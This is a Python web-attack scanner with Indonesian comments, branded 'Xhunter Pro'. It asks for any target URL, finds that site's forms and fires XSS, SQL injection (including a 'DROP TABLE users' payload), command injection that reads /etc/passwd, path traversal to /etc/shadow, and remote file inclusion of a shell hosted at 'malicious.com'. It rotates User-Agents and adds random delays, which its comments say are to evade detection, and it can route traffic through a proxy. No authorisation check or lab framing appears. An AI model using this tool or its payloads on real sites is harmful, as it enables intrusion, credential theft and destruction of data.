import requests
from bs4 import BeautifulSoup
import random
import time

# Daftar User-Agent untuk menghindari deteksi
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

# Fungsi untuk mengirimkan bug uji coba ke form web
def bug_injection_test(url, proxies=None):
    # Payload untuk berbagai jenis serangan
    payloads = {
        'xss': [
            "<script>alert('Bug Xhunter - XSS')</script>",
            "');alert('Bug Xhunter - XSS');//",
            "<img src=x onerror=alert('Bug Xhunter - XSS')>",
            "><svg onload=alert('Bug Xhunter - XSS')>",
            "<iframe src='javascript:alert(\"Bug Xhunter - XSS\")'></iframe>",
            "%3Cscript%3Ealert(%27Bug%20Xhunter%20-%20XSS%27)%3C/script%3E",
        ],
        'sql': [
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "' AND 1=0 UNION SELECT username, password FROM users --",
            "1' OR '1'='1' #",
        ],
        'command': [
            "; ls",
            "| dir",
            "&& whoami",
            "&& ping -c 4 127.0.0.1",
            "&& cat /etc/passwd",
        ],
        'lfi': [
            "../../../etc/passwd",
            "../../../../etc/shadow",
            "../config.php",
            "../index.php",
        ],
        'rfi': [
            "http://malicious.com/shell.php",
            "http://malicious.com/malware.txt",
        ],
    }

    try:
        response = requests.get(url, headers={'User-Agent': random.choice(user_agents)}, proxies=proxies)
        response.raise_for_status()  # Menangani HTTP errors
        soup = BeautifulSoup(response.text, 'html.parser')

        # Mencari semua form di halaman
        forms = soup.find_all('form')
        if forms:
            for form in forms:
                action = form.get('action')

                # Pastikan action tidak None
                if action is None:
                    print(f"[-] Form di {url} tidak memiliki action.")
                    continue  # Lewati form ini

                full_url = action if action.startswith('http') else url.rstrip('/') + '/' + action.lstrip('/')

                # Uji semua payload
                for payload_type, payload_list in payloads.items():
                    for payload in payload_list:
                        data = {input_tag.get('name'): payload for input_tag in form.find_all('input')}
                        post_response = requests.post(full_url, data=data, headers={'User-Agent': random.choice(user_agents)}, proxies=proxies)

                        if payload_type == 'xss' and payload in post_response.text:
                            print(f"[!] XSS berhasil disisipkan di {full_url} dengan payload: {payload}")
                            break
                        elif payload_type == 'sql' and ("syntax error" in post_response.text or "database error" in post_response.text):
                            print(f"[!] SQL Injection berhasil di {full_url} dengan payload: {payload}")
                            break
                        elif payload_type == 'command' and ("uid" in post_response.text or "ls" in post_response.text):
                            print(f"[!] Command Injection berhasil di {full_url} dengan payload: {payload}")
                            break
                        elif payload_type == 'lfi':
                            full_url_lfi = f"{full_url}?file={payload}"
                            lfi_response = requests.get(full_url_lfi, headers={'User-Agent': random.choice(user_agents)}, proxies=proxies)
                            if "root:" in lfi_response.text or "/etc/passwd" in lfi_response.text:
                                print(f"[!] LFI berhasil di {full_url} dengan payload: {payload}")
                                break
                        elif payload_type == 'rfi':
                            full_url_rfi = f"{full_url}?file={payload}"
                            rfi_response = requests.get(full_url_rfi, headers={'User-Agent': random.choice(user_agents)}, proxies=proxies)
                            if "PHP" in rfi_response.text or "Warning" in rfi_response.text:
                                print(f"[!] RFI berhasil di {full_url} dengan payload: {payload}")
                                break

                        # Jika tidak ada bug yang ditemukan, lanjutkan
                        print(f"[-] Tidak ada indikasi {payload_type.upper()} di {full_url} dengan payload: {payload}")

                # Jeda antara permintaan untuk menghindari deteksi
                time.sleep(random.uniform(1, 3))
        else:
            print(f"[-] Tidak ada form ditemukan di {url}")
    except requests.exceptions.HTTPError as e:
        print(f"HTTP Error pada {url}: {str(e)}")
    except requests.exceptions.RequestException as e:
        print(f"Error pada {url}: {str(e)}")


if __name__ == "__main__":
    print("==================================")
    print("    Xhunter Pro  Zamur            ")
    print("==================================")

    target_url = input("Masukkan URL target: ")
    use_proxy = input("Apakah Anda ingin menggunakan proxy? (y/n): ")

    proxies = None
    if use_proxy.lower() == 'y':
        proxy_address = input("Masukkan alamat proxy (contoh: http://127.0.0.1:8080): ")
        proxies = {
            "http": proxy_address,
            "https": proxy_address,
        }

    bug_injection_test(target_url, proxies)
